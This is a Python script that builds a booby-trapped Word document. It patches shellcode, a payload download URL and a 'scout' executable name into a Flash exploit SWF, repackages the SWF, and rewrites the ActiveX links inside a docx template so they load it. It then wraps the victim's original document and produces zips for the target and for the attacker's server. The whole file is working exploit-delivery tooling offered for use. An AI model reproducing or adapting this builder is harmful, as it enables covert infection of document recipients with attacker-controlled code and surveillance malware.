import sys
import os
import warnings
import zlib
import pylzma
import struct
import random
from zipfile import ZipFile

def random_id(length):
    number = '0123456789'
    alpha = 'abcdefghijklmnopqrstuvwxyz'
    id = ''
    for i in range(0,length,2):
        id += random.choice(number)
        id += random.choice(alpha)
    return id 



SWF_RANDOM_NAME = random_id(12) + ".swf"

SCOUT_NAME = sys.argv[8]
EXE_URL = sys.argv[2]
SWF_URL = "/".join(sys.argv[2].split("/")[0:-1]) + '/' + SWF_RANDOM_NAME
input_file = sys.argv[4]
output_file = sys.argv[5]
send_to_target_zip = sys.argv[3]
send_to_server_zip = sys.argv[7]
INPUT_SCOUT = sys.argv[6]



print SCOUT_NAME
print EXE_URL
print SWF_URL
print input_file
print output_file
print send_to_target_zip
print send_to_server_zip
print INPUT_SCOUT



#sys.exit(0)
#SCOUT_NAME = "CCC.exe"
#SWF_URL = "http://hyperslop.sysenter-honeynet.org/pippolo.swf?"
#EXE_URL = "http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe"




#input_file = "originale.docx"
#output_file = "output.docx"
template_file = "container.docx"
exploit_file = "exploit.swf"

URL_OFFT = 0x2a8 + (48*2)
SCOUT_OFFT = 0x3b0 + (48*2)


ole_swflink_path = "tmp/word/activex/activex1.bin"
original_doc_path = "tmp/word/embeddings/Microsoft_Word_Document1.docx"

MAX_SHELLCODE = 5800

def byteArray2String(param):
	with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp = os.tempnam()

	f = open(tmp, 'wb')
	f.write(param)
	f.close()
	
	f = open(tmp, 'rb')
	result = f.read()
	f.close()
	
	try:
		os.unlink(tmp)
	except WindowsError:
		print "I/O error when deleting %s file"%(tmp)
	
	return result
    

# decompress swf
compressed_swf = open(exploit_file, 'rb').read()
swf_buff = zlib.decompress(compressed_swf[8:])

# get offset of shellcode
stage2_offset = swf_buff.find(b"00000000000000006408908F")
if stage2_offset == 0:
    print "[!!] Gadget for shellcode not found"
    sys.exit(-1)
print "[+] Gadget for shellcode found @ 0x%x" %(stage2_offset)

swf_bytearray = bytearray(swf_buff)

# replace shellcode
shellcode = open("shellcode", 'rb').read()
if len(shellcode) > MAX_SHELLCODE:
       print "[!!] Shellcode too big: 0x%x" % (len(shellcode))
       sys.exit(-1)

hex_shellcode = shellcode.encode('hex')
for i in range(len(hex_shellcode)):
    swf_bytearray[stage2_offset + i] = hex_shellcode[i]
    
# modify URL
hex_url = EXE_URL.encode('hex') + "0000"
print "[+] Hex URL => %s (%s) (%d)" %(hex_url, EXE_URL, len(EXE_URL))
for i in range(len(hex_url)):
    print "%d) %c" % (i, hex_url[i])
    swf_bytearray[stage2_offset + URL_OFFT + i] = hex_url[i]
    

# modify scout name
hex_scout = "5c" + SCOUT_NAME.encode('hex') + "0000"
print "[+] Scout Name => %s" % (hex_scout)
for i in range(len(hex_scout)):
    swf_bytearray[stage2_offset + SCOUT_OFFT + i] = hex_scout[i]

# compress swf
if not os.path.exists("output"):
    os.mkdir("output")

uncompressed_len = len(swf_bytearray)
uncompressed_len += len("ZWS\x0d") 
uncompressed_len += 4 # + se stessa

print "[+] Uncompressed len: 0x%x" %(uncompressed_len)
lzma_buff = pylzma.compress(byteArray2String(swf_bytearray))

compressed_len = len(lzma_buff) - 5
print "[+] Compressed len: 0x%x" %(compressed_len)

output_buff = "ZWS\x0d"
output_buff += struct.pack("<L", uncompressed_len)
output_buff += struct.pack("<L", compressed_len)
output_buff += lzma_buff
# write it in output/exploit.swf
open(SWF_RANDOM_NAME, 'wb').write(output_buff)



# extract docx
if not os.path.exists("tmp"):
    os.mkdir("tmp")
myzip = ZipFile(template_file)
myzip.extractall("tmp")

# search link to swf exploit
ole_link_buff = open(ole_swflink_path, 'rb').read()
ole_link_offt = ole_link_buff.find("h\x00t\x00t\x00p")
print "[+] Offset to first link: 0x%x" %(ole_link_offt)

ole_link2_offt = ole_link_buff.find("h\x00t\x00t\x00p", ole_link_offt+1) 
print "[+] Offset to second link: 0x%x" %(ole_link2_offt)

ole_link3_offt = ole_link_buff.find("h\x00t\x00t\x00p", ole_link2_offt+1) 
print "[+] Offset to third link: 0x%x" %(ole_link3_offt)

# change lnk to swf
swf_url_bytearray = bytearray(SWF_URL)
ole_link_bytearray = bytearray(ole_link_buff)
for i in range(len(ole_link_bytearray)):
    if i == ole_link_offt or i == ole_link2_offt or i == ole_link3_offt:
        y = 0
        for x in range(len(swf_url_bytearray)):
            ole_link_bytearray[i+y] = swf_url_bytearray[x]
            ole_link_bytearray[i+y+1] = 0x0
            y += 2

# dump modified ole link            
open(ole_swflink_path, 'wb').write(byteArray2String(ole_link_bytearray))


# replace the original docx
open(original_doc_path, 'wb').write(open(input_file, 'rb').read())

cwd = os.getcwd()
# write output
newzip = ZipFile(output_file, "w")
os.chdir(os.getcwd()+"\\tmp")
for dirname, subdirs, files in os.walk("."):
    print dirname
    newzip.write(dirname)
    for filename in files:
        print os.path.join(dirname, filename)
        newzip.write(os.path.join(dirname, filename))

newzip.close()
os.chdir(cwd)


newzip = ZipFile(send_to_target_zip, 'w')
newzip.write(output_file)
newzip.close()


newzip = ZipFile(send_to_server_zip, 'w')
newzip.write(SWF_RANDOM_NAME)
newzip.write(INPUT_SCOUT)
newzip.close()



